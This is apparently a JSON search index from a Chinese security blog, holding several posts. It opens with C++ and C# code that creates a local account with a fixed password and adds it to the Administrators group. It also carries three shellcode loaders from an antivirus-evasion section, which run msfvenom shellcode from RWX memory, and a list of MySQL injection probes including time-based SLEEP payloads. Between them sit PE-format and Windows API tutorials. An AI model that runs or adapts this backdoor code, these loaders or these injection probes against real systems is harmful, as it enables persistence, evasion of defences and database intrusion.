SECURITY_BUILTIN_DOMAIN_RID, 0, 0, 0, 0, 0, 0, 0, \u0026amp;pBuiltinSid); std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening Builtin Domain...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamOpenDomain(hSam, MAXIMUM_ALLOWED, pBuiltinSid, \u0026amp;hBuiltinDomain); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamOpenDomain (Builtin) failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening Administrators Alias...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamOpenAlias(hBuiltinDomain, MAXIMUM_ALLOWED, 0x220, \u0026amp;hAlias); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamOpenAlias failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[*] Adding user to Administrators...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamAddMemberToAlias(hAlias, pUserSid); if (status \u0026lt; 0) { if (status == 0xC0000035) std::cout \u0026lt;\u0026lt; \u0026#34;[!] User is already in Administrators group.\u0026#34; \u0026lt;\u0026lt; std::endl; else std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamAddMemberToAlias failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] User successfully added to Administrators group!\u0026#34; \u0026lt;\u0026lt; std::endl; } SamCloseHandle(hAlias); } SamCloseHandle(hBuiltinDomain); } FreeSid(pBuiltinSid); HeapFree(GetProcessHeap(), 0, pUserSid); } SamCloseHandle(hDomain); SamCloseHandle(hSam); HeapFree(GetProcessHeap(), 0, pAccountSid); std::cout \u0026lt;\u0026lt; \u0026#34;Done.\u0026#34; \u0026lt;\u0026lt; std::endl; return 0; } C## 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 using System; using System.DirectoryServices; class Class1 { static void Main(string[] args) { try { string randomStr = new Random().Next(100, 999).ToString(); //string username = \u0026#34;admin\u0026#34; + randomStr + \u0026#34;$\u0026#34;; //string password = \u0026#34;Admin.\u0026#34; + randomStr; string username = \u0026#34;admins\u0026#34;; string password = \u0026#34;Abc.123\u0026#34;; DirectoryEntry AD = new DirectoryEntry(\u0026#34;WinNT://\u0026#34; + Environment.MachineName + \u0026#34;,computer\u0026#34;); DirectoryEntry NewUser = AD.Children.Add(username, \u0026#34;user\u0026#34;); NewUser.Invoke(\u0026#34;SetPassword\u0026#34;, new object[] { password }); NewUser.Invoke(\u0026#34;Put\u0026#34;, new object[] { \u0026#34;Description\u0026#34;, \u0026#34;系统管理的用户帐户。\u0026#34; }); NewUser.CommitChanges(); DirectoryEntry grp; grp = AD.Children.Find(\u0026#34;Administrators\u0026#34;, \u0026#34;group\u0026#34;); if (grp != null) { grp.Invoke(\u0026#34;Add\u0026#34;, new object[] { NewUser.Path.ToString() }); } Console.WriteLine(\u0026#34;添加成功\u0026#34;); Console.WriteLine(\u0026#34;User：\u0026#34; + username); Console.WriteLine(\u0026#34;Password：\u0026#34; + password); } catch (Exception ex) { Console.WriteLine(ex.Message); } } } "},{"id":5,"href":"/posts/2026/01/pe-file-structure/","title":"PE文件结构","section":"免杀\u0026Tip","content":" PE# 可移植性可执行文件。\nPE (Portable Executable) 是 Windows 下的可执行文件格式（主要用于.exe, .dll, .sys）,主要使用在32位和64位的Windows操作系统。\n硬盘上的 .exe 文件 内存中的进程 (Virtual Memory) +-----------------+ +-----------------+ | DOS Header | -\u0026gt; | DOS Header | +-----------------+ +-----------------+ | NT Headers | -\u0026gt; | NT Headers | +-----------------+ +-----------------+ | Section Table | -\u0026gt; | Section Table | +-----------------+ +-----------------+ | .text (Code) | -\u0026gt; | .text (Code) | \u0026lt;-- AddressOfEntryPoint 指向这 +-----------------+ | (Alignment) | \u0026lt;-- 内存对齐产生的空隙 | .data (Vars) | -\u0026gt; | .data (Vars) | +-----------------+ +-----------------+PE 结构自上而下分为 4 个核心部分 ：\nDOS头# DOS 头 ( IMAGE_DOS_HEADER ) 是 PE 文件的第一部分，固定大小为 64 字节 (0x40)。\nMicrosoft 官方在 Windows SDK 头文件 ( winnt.h ) 中对 DOS 头数据结构的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 typedef struct _IMAGE_DOS_HEADER { // DOS .EXE header WORD e_magic; // [0x00] Magic number (\u0026#34;MZ\u0026#34;) WORD e_cblp; // [0x02] Bytes on last page of file WORD e_cp; // [0x04] Pages in file WORD e_crlc; // [0x06] Relocations WORD e_cparhdr; // [0x08] Size of header in paragraphs WORD e_minalloc; // [0x0A] Minimum extra paragraphs needed WORD e_maxalloc; // [0x0C] Maximum extra paragraphs needed WORD e_ss; // [0x0E] Initial (relative) SS value WORD e_sp; // [0x10] Initial SP value WORD e_csum; // [0x12] Checksum WORD e_ip; // [0x14] Initial IP value WORD e_cs; // [0x16] Initial (relative) CS value WORD e_lfarlc; // [0x18] File address of relocation table WORD e_ovno; // [0x1A] Overlay number WORD e_res[4]; // [0x1C] Reserved words WORD e_oemid; // [0x24] OEM identifier (for e_oeminfo) WORD e_oeminfo; // [0x26] OEM information; e_oemid specific WORD e_res2[10]; // [0x28] Reserved words LONG e_lfanew; // [0x3C] File address of new exe header (PE Header) } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 关键字段详解# e_magic (0x00 - 0x02) 值 : 必须是 0x5A4D 。\nASCII : \u0026ldquo;MZ\u0026rdquo;。纪念 Mark Zbikowski（MS-DOS 的设计者之一）。\n作用 : 操作系统加载文件时会读取前两个字节。如果不是 \u0026ldquo;MZ\u0026rdquo;，直接报错“不是有效的 Win32 应用程序”。\nPS：在小端序系统中， 低位字节存储在低地址，高位字节存储在高地址 。当你用十六进制编辑器（Hex Editor）按顺序看文件内容时，你看到的是 4D 5A （也就是 \u0026ldquo;MZ\u0026rdquo;）。但当你用 C 语言把这两个字节读成一个 WORD (整数) 时，CPU 会把它们倒过来组合，还原成 0x5A4D 。\ne_res 和 e_res2 (保留字段)\n在现代 Windows 中，这些区域完全不被使用，里面的数据通常是 0。\ne_lfanew (0x3C - 0x40)\n位置 : 结构体的最后 4 个字节 (偏移 60)。\n类型 : LONG (4字节整数)。\n指向 PE 头 (NT Headers) 的文件偏移量。它是连接 DOS 时代和 Windows 时代的桥梁。Windows 加载器读取 DOS 头后，直接跳到 e_lfanew 指向的位置去读取真正的 PE 头。\n常见值 : 通常是 0x00000080 或 0x000000E0 ，但这不固定。你可以把它改成 0x40 （紧挨着 DOS 头），也可以改成 0x1000 （隔得很远），只要文件里对应位置有 PE 头就行。\nDOS Stub (DOS 存根)# 紧跟在 IMAGE_DOS_HEADER 之后， PE Header 之前，有一段代码叫 DOS Stub。\n内容 : 这是一段 16 位的汇编代码。\n作用 : 当你在纯 DOS 环境下（比如 MS-DOS 6.22）运行这个 Windows exe 时，这段代码会被执行。\n默认行为 : 打印字符串 \u0026ldquo;This program cannot be run in DOS mode.\u0026rdquo; 然后退出。\nNT Headers# NT Headers 结构 (IMAGE_NT_HEADERS)# 它在内存中通常位于 0xE0 左右（由 DOS 头的 e_lfanew 决定）。它是一个大结构体，里面包含了三个关键部分：\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; // [1] 签名 \u0026#34;PE\\0\\0\u0026#34; IMAGE_FILE_HEADER FileHeader; // [2] 文件头 (物理属性) IMAGE_OPTIONAL_HEADER32 OptionalHeader; // [3] 可选头 (逻辑属性) } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; Signature (签名) - 4字节 值 : 0x00004550 (ASCII: \u0026ldquo;PE\\0\\0\u0026rdquo;)。\n这是 PE 文件的身份证。Windows 加载器跳到这里，先看这4个字节。如果不是 \u0026ldquo;PE\\0\\0\u0026rdquo;，系统就认为它不是有效的 PE 文件。\nFile Header (文件头) - 20字节\n包含文件最基本的物理属性。重要字段：\nMachine : CPU 架构。 0x014c (x86), 0x8664 (x64)。\nNumberOfSections : 节的数量（比如 .text, .data, .rdata 加起来有几个）。\nTimeDateStamp : 编译时间戳。非常有用的溯源信息（虽然可以伪造）。\nSizeOfOptionalHeader : 后面那个“可选头”的大小。\nCharacteristics : 文件属性标志（是不是 DLL？是不是系统文件？）。\nOptional Header (可选头) - 大小可变 (x86通常224字节)\n名字叫“可选”，它告诉操作系统如何加载和运行这个文件。 重要字段：\nAddressOfEntryPoint (OEP) : 程序入口点 RVA。程序跑起来后第一条指令在哪里？就看这里。\nImageBase : 建议加载基址。exe 默认是 0x400000 。\nSectionAlignment : 内存对齐大小（通常 4KB）。\nFileAlignment : 硬盘对齐大小（通常 512字节）十六进制 (0x200)=512字节。\nDataDirectory[16] : 数据目录表 。这是通往 16 个关键数据结构的“直通车”数组：\nIndex 0: 导出表 (Export Table) Index 1: 导入表 (Import Table) - 决定了你要调用哪些 DLL。 Index 2: 资源表 (Resource Table) - 图标、光标、菜单。 Index 5: 重定位表 (Relocation Table) - 用于 ASLR。 Index 14: CLR 头 (.NET 程序专用)。 节表 (Section Table) (区段表/区段头)# 结构体 ( IMAGE_SECTION_HEADER )# typedef struct _IMAGE_SECTION_HEADER { BYTE Name[8]; // [1] 节名 (如 \u0026#34;.text\u0026#34;, \u0026#34;.data\u0026#34;) union { DWORD PhysicalAddress; DWORD VirtualSize; // [2] 内存中的实际大小 (未对齐) } Misc; DWORD VirtualAddress; // [3] 内存中的 RVA (对齐后) DWORD SizeOfRawData; // [4] 硬盘上的大小 (对齐后) DWORD PointerToRawData; // [5] 硬盘上的文件偏移 DWORD PointerToRelocations; // (obj文件用，exe通常为0) DWORD PointerToLinenumbers; // (调试用，通常为0) WORD NumberOfRelocations; // (obj文件用) WORD NumberOfLinenumbers; // (调试用) DWORD Characteristics; // [6] 属性 (读/写/执行) } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;[1] Name (8字节)\n节的名字，如 .text , .rdata 。 注意 : 这只是个标记，系统加载器并不真正关心它叫什么。你可以把它改成 .hacker 甚至乱码，程序依然能跑。只要别超过8个字节。 [2] VirtualSize (内存大小) vs [4] SizeOfRawData (硬盘大小) 这俩通常不一样，这是检测**“壳”**的重要特征！\n正常情况 : VirtualSize ≈ SizeOfRawData 。 加壳/压缩 : VirtualSize (比如 1MB) \u0026raquo; SizeOfRawData (比如 100KB)。说明数据在硬盘上是压缩的，加载到内存后会解压变大。 未初始化变量 (.bss) : VirtualSize \u0026gt; 0, SizeOfRawData = 0。说明这块内存在硬盘上不占地儿，但加载到内存要占位。 [3] VirtualAddress (内存 RVA)\n这个节加载到内存后，离 ImageBase 有多远。 必须是 SectionAlignment (0x1000) 的整数倍。 [5] PointerToRawData (文件偏移)\n这个节的内容在 exe 文件里的具体位置（比如从第 1024 字节开始）。 必须是 FileAlignment (0x200) 的整数倍。 [6] Characteristics (属性标志) 决定了这个节的权限。由位掩码控制：\n0x20000000 (IMAGE_SCN_MEM_EXECUTE): 可执行 (代码段必须有) 0x40000000 (IMAGE_SCN_MEM_READ): 可读 0x80000000 (IMAGE_SCN_MEM_WRITE): 可写 (数据段必须有) 节数据 (Section Data)(区段)# 这是 PE 文件的主体部分，占用了 90% 以上的体积。它们按照节表的顺序依次排列。\n节表 (Section Table) ：是 元数据 (Metadata) 。它是一张清单，告诉系统有哪些节，每个节多大，放在哪里，有什么属性（可读/可写/可执行）。 节数据 (Section Data) ：是 实体数据 (Raw Data) 。它是真正存放代码（机器码）、变量、图片资源的地方。 [ PE 文件结构 ] +-------------------+ | DOS Header | +-------------------+ | NT Headers | +-------------------+ \u0026lt;--- 1. 节表在这里 (目录) | Section Table | 它记录了： | - .text Header | --------+ (指向 .text 的数据位置) | - .data Header | ------+ | | - .rsrc Header | ----+ | | +-------------------+ | | | | (Padding) | | | | +===================+ | | | | Section Data | \u0026lt;---+ | | | - .text Data | | | | (机器码...) | | | +-------------------+ | | | - .data Data | \u0026lt;-----+ | | (全局变量...) | | +-------------------+ | | - .rsrc Data | \u0026lt;-------+ | (图标/菜单...) | +-------------------+ 对于大多数普通的 EXE/DLL，最后一个节（通常是 .rsrc 或 .reloc ）的数据结束后，文件就到头了。\n"},{"id":6,"href":"/posts/2026/01/windows-api-levels/","title":"Windows API 调用层级","section":"免杀\u0026Tip","content":" 第一层：Standard Library (标准库层)# 例如：C语言中的\n1 FILE* fp = fopen(\u0026#34;test.txt\u0026#34;, \u0026#34;w\u0026#34;); // 在这里下断点 或者java中的：\n1 new FileOutputStream(\u0026#34;test.txt\u0026#34;); 第二层：Win32 API / Windows Subsystem (子系统层)# 这是微软官方提供给开发者的一套标准接口，通常位于 Kernel32.dll 、 User32.dll 等 DLL 中。 当 fopen 在 Windows 上运行时，它最终会调用：\n1 CreateFileA(\u0026#34;test.txt\u0026#34;, ...); // 位于 Kernel32.dll 第三层：Native API (原生 API 层)# Kernel32.dll 中的 CreateFile 经过一系列检查后，会调用更底层的函数。这个函数位于 Ntdll.dll 中：\n1 2 NtCreateFile(...); // 或者 ZwCreateFile NtCreateFile 的核心任务只有两件事：\n把 系统调用号 (SSN) 放进 EAX 寄存器（例如 Win10 上可能是 0x55 ）。 执行 syscall 指令（x64）或 sysenter 指令（x86）。 ====== 跨越边界：用户态 (User Mode) -\u0026gt; 内核态 (Kernel Mode) ======# 执行 syscall 指令后，CPU 权限从 Ring 3 切换到 Ring 0。\n第四层：System Service Dispatcher (系统服务分发层)# CPU 切换到内核态后，会跳转到内核文件 ntoskrnl.exe 中的一个特定处理函数（通常是 KiSystemCall64 ）。它读取 EAX 中的号码（SSN），去查一张表—— SSDT (System Service Descriptor Table) ，根据号码找到对应的内核处理函数地址。\n第五层：Kernel Executive (内核执行体层)# SSDT 指向了真正的内核函数：\nNtCreateFile(...); // 位于 ntoskrnl.exe，名字和 Ntdll 里的一样，但代码完全不同Visual Studio 调试fopen底层API# 配置 Visual Studio 调试环境# 去掉勾选启用\u0026quot;仅我的代码\u0026quot; 启用符号服务器\n调试 (Debugging) -\u0026gt; 符号 (Symbols) -\u0026gt; 勾选 Microsoft 符号服务器 (Microsoft Symbol Servers) 。\n1 2 3 4 5 6 7 8 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; int main() { FILE* fp = fopen(\u0026#34;test.txt\u0026#34;, \u0026#34;w\u0026#34;); // 在这里下断点 if (fp) fclose(fp); return 0; } 可以配置断点快速确认：\nRing 0层VS就无法看到了\n底层函数在线查询网站# ReactOS Documentation ​\thttps://doxygen.reactos.org\nUndocumented NT Internals\nhttps://undocumented.ntinternals.net\n"},{"id":7,"href":"/posts/2026/01/apc-local-injection/","title":"APCLocalInjection","section":"免杀\u0026Tip","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #include \u0026lt;windows.h\u0026gt; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // 申请内存 (RWX) void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 复制shellcdoe RtlMoveMemory(exec, buf, sizeof(buf)); // 插入 APC 队列 // 参数1: APC 函数地址 (Shellcode) // 参数2: 目标线程句柄 (当前线程) // 参数3: 传给函数的参数 QueueUserAPC((PAPCFUNC)exec, GetCurrentThread(), NULL); // 触发执行 (Alertable State) // 线程必须进入\u0026#34;可警告状态\u0026#34;，APC 才会执行。 // SleepEx 的第二个参数 TRUE 表示允许被 APC 打断。 SleepEx(1000, TRUE); return 0; } "},{"id":8,"href":"/posts/2026/01/cs-dev/","title":"Cobaltstrike二开","section":"CobaltStrike","content":" 1 #include \u0026#34;cs.h\u0026#34; "},{"id":9,"href":"/posts/2026/01/create-thread-injection/","title":"CreateThreadInjection","section":"免杀\u0026Tip","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include \u0026lt;windows.h\u0026gt; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // 1. 申请内存 (RWX) void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 2. 复制数据 RtlMoveMemory(exec, buf, sizeof(buf)); // 3. 创建线程执行 HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0); // 4. 等待执行结束 WaitForSingleObject(th, -1); return 0; } "},{"id":10,"href":"/posts/2026/01/mysql-injection/","title":"MySQL injection","section":"MySQL 注入","content":" 检测payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026#39; \u0026#34; ` %df\u0026#39; %27 %2527 ) )) \u0026#39;) \u0026#34;) ; -- /* # 1+1 1-0 1/0 1e308 %0a %09 -- AND 1=1 AND 1=2 \u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;2 \u0026#34; AND \u0026#34;1\u0026#34;=\u0026#34;1 \u0026#34; AND \u0026#34;1\u0026#34;=\u0026#34;2 \u0026#39;) AND (\u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; AND SLEEP(5)--+ \u0026#34; AND SLEEP(5)--+ AND (SELECT * FROM (SELECT(SLEEP(5)))a) "},{"id":11,"href":"/posts/2026/01/local-process-injection/","title":"LocalProcessInjection","section":"免杀\u0026Tip","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026#34;Windows.h\u0026#34; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; } "},{"id":12,"href":"/posts/2026/01/my-first-post/","title":"My First Post","section":"Posts","content":"Introduction# This is bold text, and this is emphasized text.\nVisit the Hugo website!\n"},{"id":13,"href":"/about/","title":"关于我","section":"Fivesix's blog","content":"👋 你好！# 🈚️\n"}]